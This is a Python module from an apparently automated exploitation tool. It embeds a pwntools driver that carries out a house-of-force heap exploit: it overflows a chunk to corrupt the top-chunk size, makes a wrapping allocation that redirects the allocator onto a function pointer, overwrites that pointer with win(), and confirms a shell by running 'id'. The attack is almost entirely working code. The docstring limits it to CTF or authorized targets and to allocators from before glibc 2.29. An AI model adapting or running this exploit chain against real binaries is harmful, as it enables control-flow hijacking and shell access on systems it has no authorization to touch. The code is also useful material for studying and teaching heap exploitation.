"""House-of-force, verified by execution.

House-of-force overwrites the top chunk's size with a huge value, so an attacker-chosen (huge,
wrapping) allocation request moves the allocator's `top` to an arbitrary address; the next
allocation then returns a pointer there -> arbitrary write -> hijack a function pointer -> shell.

IMPORTANT: real glibc house-of-force is MITIGATED since glibc 2.29 (the top-chunk size is
sanity-checked against the arena). binoracle verifies the technique against a target whose allocator
reproduces the pre-2.29 top-chunk carve (the exact condition HoF abuses); it degrades honestly when
that shape is not present. The chain uses the address wraparound that moves `top` backward when the
hijack target sits below the heap. For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (hof driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
# the practice shape exposes a fixed arena, a hijackable function pointer, and a win() gift
heap = sym.get("heap") or sym.get("arena") or sym.get("buf")
win = sym.get("win")
handler = sym.get("handler") or sym.get("fnptr") or sym.get("hook")
if heap is None or win is None or handler is None:
    print("NOT_APPLICABLE (no house-of-force practice shape: need heap+handler+win symbols)"); sys.exit(1)

M = (1 << 64) - 1
MARK = b"BINORACLE_HOF_PWNED"

def attempt(need_a):
    # top chunk after the first chunk is at heap+need_a; its size field is at heap+need_a+8.
    # overflow the first chunk's data (at heap+16) up to that size field, set it huge, then request
    # a (wrapping) size that lands `top` so the following allocation returns &handler.
    T1 = heap + need_a
    need_sz = ((handler - 16) - T1) & M
    n = (need_sz - 16) & M
    pad = (T1 + 8) - (heap + 16)
    if pad < 0:
        return False
    overflow = b"A" * pad + p64(M)
    io = None
    try:
        io = process([name])
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(overflow); time.sleep(0.1)          # stage 1: overwrite top->size
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(p64(n)); time.sleep(0.1)            # stage 2: huge (wrapping) request moves top
        try: io.recvrepeat(0.2)
        except Exception: pass
        io.send(p64(win)); time.sleep(0.25)         # stage 3: arbitrary write -> handler = win
        io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
        out = b""
        try: out = io.recvrepeat(1.1)
        except Exception: pass
        io.close()
        return (MARK in out) or (b"uid=" in out)
    except Exception:
        try:
            if io: io.close()
        except Exception: pass
        return False

# sweep the first allocation's rounded size (header+aligned payload); 0x30 covers malloc(1..24)
for need_a in (0x30, 0x20, 0x40, 0x50, 0x60, 0x80):
    if attempt(need_a):
        print("VERIFIED need_a=%#x heap=%#x handler=%#x win=%#x" % (need_a, heap, handler, win))
        sys.exit(0)
print("NOT_VERIFIED")
sys.exit(1)
'''


def autohof(binary: str) -> dict:
    """House-of-force verificado por ejecucion (contra un asignador que reproduce el top-chunk
    pre-2.29). Necesita la forma de practica (simbolos heap/handler/win). Docker o nativo."""
    res = run_driver(binary, _DRIVER, ".binoracle_hof.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"house-of-force (top-chunk pre-2.29): top movido a direccion arbitraria -> "
                   f"escritura -> hijack -> shell verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"house-of-force: no verificado ({eng}) (sin la forma HoF o glibc >=2.29 lo mitiga)")
    return res


def render_hof(r: dict) -> str:
    out = ["## Auto house-of-force (top-chunk, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    out.append("\n_nota: el house-of-force de glibc esta mitigado desde 2.29 (chequeo del tamano del "
               "top chunk); la verificacion usa un asignador que reproduce el carve pre-2.29._")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
